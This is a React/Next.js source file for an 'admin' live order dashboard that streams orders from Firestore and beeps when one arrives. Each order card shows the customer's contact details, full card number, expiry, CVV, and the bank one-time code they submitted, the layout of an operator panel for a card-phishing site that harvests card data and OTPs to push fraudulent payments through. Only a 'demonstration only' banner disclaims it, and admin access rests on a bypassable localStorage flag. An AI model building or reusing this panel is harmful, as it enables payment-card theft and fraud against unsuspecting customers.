'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import { db } from '@/lib/firebase';
import { collection, onSnapshot, query, orderBy, Timestamp } from 'firebase/firestore';
import type { Order } from '@/lib/types';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { LogOut, BellRing, Package, User, CreditCard, ShieldCheck } from 'lucide-react';
import { Button } from '@/components/ui/button';

export default function AdminDashboard() {
  const router = useRouter();
  const [orders, setOrders] = useState<Order[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const isInitialLoad = useRef(true);

  // Function to play a notification sound
  const playAlarmSound = useCallback(() => {
    // A simple, browser-generated beep to avoid needing an audio file.
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    if (!audioContext) return;
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    oscillator.type = 'sine';
    oscillator.frequency.setValueAtTime(880, audioContext.currentTime); // Higher pitch
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.0001, audioContext.currentTime + 0.5);
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.5);
  }, []);

  useEffect(() => {
    // Basic client-side auth check
    if (localStorage.getItem('isAdminLoggedIn') !== 'true') {
      router.replace('/admin/login');
      return;
    }

    // Set up Firestore listener for real-time order updates
    const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'));

    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      const fetchedOrders: Order[] = [];
      querySnapshot.forEach((doc) => {
        fetchedOrders.push({ ...doc.data(), orderId: doc.id } as Order);
      });
      setOrders(fetchedOrders);
      
      // On new order (but not initial load), play sound
      if (!isInitialLoad.current) {
        playAlarmSound();
      } else {
        isInitialLoad.current = false;
      }

      setIsLoading(false);
    }, (error) => {
      console.error("Error fetching real-time orders:", error);
      setIsLoading(false);
    });

    // Clean up the listener on component unmount
    return () => unsubscribe();
  }, [router, playAlarmSound]);

  const handleLogout = () => {
    localStorage.removeItem('isAdminLoggedIn');
    router.push('/admin/login');
  };

  const formatTimestamp = (timestamp: Timestamp | Date) => {
    if (!timestamp) return 'N/A';
    const date = (timestamp as Timestamp).toDate ? (timestamp as Timestamp).toDate() : (timestamp as Date);
    return date.toLocaleString();
  };

  if (isLoading) {
    return <div className="flex h-screen items-center justify-center"><BellRing className="h-8 w-8 animate-pulse" /> <span className="ml-4 text-xl">Loading Live Orders...</span></div>;
  }
  
  return (
    <div className="min-h-screen bg-muted/40 p-4 sm:p-8">
      <header className="flex justify-between items-center mb-8">
        <div>
          <h1 className="text-3xl font-bold text-primary font-headline">Live Order Dashboard</h1>
          <p className="text-muted-foreground font-body">Real-time order notifications</p>
        </div>
        <Button onClick={handleLogout} variant="outline">
          <LogOut className="mr-2 h-4 w-4" />
          Logout
        </Button>
      </header>
      
      <main className="space-y-6">
        {orders.length === 0 ? (
          <Card>
            <CardContent className="p-10 text-center text-muted-foreground">
              <BellRing className="mx-auto h-12 w-12 mb-4"/>
              <h3 className="text-xl font-semibold">No orders yet</h3>
              <p>New orders will appear here in real-time.</p>
            </CardContent>
          </Card>
        ) : (
          orders.map(order => (
            <Card key={order.orderId} className={`border-2 ${order.status === 'pending_otp' ? 'border-yellow-500 bg-yellow-50' : 'border-green-500 bg-green-50'}`}>
              <CardHeader>
                <div className="flex justify-between items-start">
                  <div>
                    <CardTitle className="flex items-center gap-2">
                       <Package /> Order ID: {order.orderId}
                    </CardTitle>
                    <CardDescription>Received at: {formatTimestamp(order.createdAt)}</CardDescription>
                  </div>
                  <Badge variant={order.status === 'completed' ? 'default' : 'destructive'} className={order.status === 'completed' ? 'bg-green-600' : 'bg-yellow-600'}>
                    {order.status === 'completed' ? 'Completed' : 'Pending OTP'}
                  </Badge>
                </div>
              </CardHeader>
              <CardContent className="grid grid-cols-1 md:grid-cols-3 gap-6">
                
                {/* User Details */}
                <div className="space-y-4">
                  <h4 className="font-semibold flex items-center gap-2 text-primary"><User />Customer Details</h4>
                  <p><strong>Name:</strong> {order.userDetails.name}</p>
                  <p><strong>Email:</strong> {order.userDetails.email}</p>
                  <p><strong>Phone:</strong> {order.userDetails.phone}</p>
                  <p><strong>Address:</strong> {order.userDetails.address}</p>
                </div>

                {/* Payment Details */}
                <div className="space-y-4">
                   <h4 className="font-semibold flex items-center gap-2 text-primary"><CreditCard />Payment Details</h4>
                   <div className="bg-red-100 border-l-4 border-red-500 text-red-700 p-3 rounded">
                    <p className="font-bold">Security Warning!</p>
                    <p className="text-xs">Exposing full card details is a major security risk. This is for demonstration only.</p>
                   </div>
                   <p><strong>Cardholder:</strong> {order.paymentDetails.cardName}</p>
                   <p><strong>Card Number:</strong> {order.paymentDetails.cardNumber}</p>
                   <p><strong>Expiry:</strong> {order.paymentDetails.expiryDate}</p>
                   <p><strong>CVV:</strong> <span className="font-bold text-red-600">{order.paymentDetails.cvv}</span></p>
                   <p><strong>Card Type:</strong> {order.paymentDetails.cardType}</p>
                   <Separator/>
                   <h4 className="font-semibold flex items-center gap-2 text-primary"><ShieldCheck />Verification OTP</h4>
                   {order.otp ? (
                     <p className="text-2xl font-bold text-green-600 tracking-widest">{order.otp}</p>
                   ) : (
                     <p className="text-muted-foreground">OTP not yet submitted by user.</p>
                   )}
                </div>

                {/* Order Items */}
                <div className="space-y-4">
                  <h4 className="font-semibold flex items-center gap-2 text-primary"><Package />Order Items</h4>
                  <ul className="space-y-2">
                    {order.items.map((item, index) => (
                      <li key={index} className="flex justify-between border-b pb-1">
                        <span>{item.name} x {item.quantity}</span>
                        <span>${item.subtotal.toFixed(2)}</span>
                      </li>
                    ))}
                  </ul>
                  <Separator/>
                   <p className="flex justify-between font-bold text-lg">
                    <span>Total Amount:</span>
                    <span>${order.totalAmount.toFixed(2)}</span>
                  </p>
                </div>

              </CardContent>
            </Card>
          ))
        )}
      </main>
    </div>
  );
}
